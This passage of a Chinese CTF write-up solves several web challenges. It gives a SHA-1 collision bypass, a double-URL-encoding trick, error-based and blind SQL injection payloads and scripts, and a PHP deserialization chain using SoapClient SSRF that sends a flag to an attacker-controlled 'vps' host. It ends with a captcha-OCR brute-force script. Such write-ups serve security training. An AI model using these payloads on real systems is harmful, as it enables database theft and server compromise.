?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>第四关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flllllllllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag: <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>url编码脚本</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Longlone'</span><span class="token punctuation">;</span> <span class="token comment">//需要二次编码的字符或字符串</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$char</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii1</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii2</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$char</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$char</span><span class="token punctuation">.</span><span class="token single-quoted-string string">': '</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">break</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p><code>right函数</code></p><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);+------------------+| RIGHT(&#39;MySQL&#39;,3) |+------------------+| SQL              |+------------------+1 row in set (0.00 sec)</code></pre><p><code>left函数</code></p><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);+-----------------------+| LEFT(&#39;MySQL LEFT&#39;, 5) |+-----------------------+| MySQL                 |+-----------------------+1 row in set</code></pre><p><code>mid函数</code>—–和substr差不多</p><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);+-------------------+| mid(&#39;adbdab&#39;,3,2) |+-------------------+| bd                |+-------------------+1 row in set (0.01 sec)</code></pre><p>substr被过了就用上面三个代替</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl<span class="token operator">=</span><span class="token string">'http://47.100.242.70:4725/check.php'</span>strr<span class="token operator">=</span>string<span class="token punctuation">.</span>printableres<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> strr<span class="token punctuation">:</span>        <span class="token comment">#payload="admi'or(mid(database(),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='easysql')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='syclover')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        payload<span class="token operator">=</span><span class="token string">"admi'or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)='&#123;&#125;')='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"pwd"</span><span class="token punctuation">:</span><span class="token string">"adm"</span><span class="token punctuation">,</span><span class="token string">"wp-submit"</span><span class="token punctuation">:</span><span class="token string">"%E7%99%BB%E5%BD%95"</span><span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'wrong password'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            res<span class="token operator">+=</span>s            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$par0</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">par0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">,</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'syclover    !'</span><span class="token punctuation">.</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi<span class="token punctuation">.</span><span class="token single-quoted-string string">'     yyds'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//$ser = serialize($this -> kelasi);</span>        <span class="token comment">//$unser = unserialize($ser);</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> kelasi <span class="token operator">-</span><span class="token operator">></span> <span class="token function">juts_a_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">newOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">==</span> <span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">qifei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">wuhu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2<span class="token punctuation">.</span><span class="token single-quoted-string string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p><p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p><p><code>hint.php</code> </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'向管理员的页面post一个参数message(告诉他，"iwantflag") 和 另一个参数 url（它会向这个url发送一个flag'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'管理员的页面在当前目录下一个特殊文件夹里'</span><span class="token punctuation">;</span><span class="token variable">$hint</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)'</span><span class="token punctuation">;</span></span></code></pre><p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p><p>读取两次</p><p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png"><br>这个只能读一行，只有个<code>&lt;?php</code></p><p>接下来<code>SoapClient打SSRF</code></p><p>官方exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par3 <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$postdata</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'message=iwantflag&amp;url=http://vps:9999'</span><span class="token punctuation">;</span><span class="token comment">//按要求设置post数据</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php'</span><span class="token punctuation">;</span><span class="token comment">//payload1 = new fxxk('','','php://filter/read=convert.base64-encode/resource=./','');#伪协议读hint</span><span class="token comment">//payload2 = new fxxk('FilesystemIterator','./',1,'echoo');#列目录</span><span class="token comment">//payload3 = new fxxk('FilesystemIterator','./aaaaaaaaaaafxadwagaefae',1,'echoo');#列目录</span><span class="token variable">$payload4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fxxk</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SoapClient'</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'wupco'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Type:'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Application/X-WWW-Form-Urlencoded'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'Content-Length:'</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$postdata</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!!!'</span><span class="token punctuation">.</span><span class="token variable">$postdata</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'baaa'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$soa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'!!'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$soa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png"></p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> re<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> ddddocr<span class="token keyword">import</span> onnxruntime<span class="token keyword">import</span> requests<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodeurl <span class="token operator">=</span> <span class="token string">"http://110.42.233.91:88/access"</span>sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>ocr <span class="token operator">=</span> ddddocr<span class="token punctuation">.</span>DdddOcr<span class="token punctuation">(</span>use_gpu<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>onnxruntime<span class="token punctuation">.</span>set_default_logger_severity<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pic_to_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"base64,(.*?)>"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>img<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    v_code <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"v_code_LA.png"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span>    v_code<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    v_code_bytes <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'v_code.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> ocr<span class="token punctuation">.</span>classification<span class="token punctuation">(</span>v_code_bytes<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"v_code.png"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> code<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    cnt <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"done (.*?) times"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> cnt <span class="token operator">==</span> <span class="token number">1000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span>    code <span class="token operator">=</span> pic_to_text<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"v_code"</span><span class="token punctuation">:</span> code    <span class="token punctuation">&#125;</span>    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        validate<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>不过这个脚本运行报错，等之后看看吧</p>]]></content>
    
    
      
      
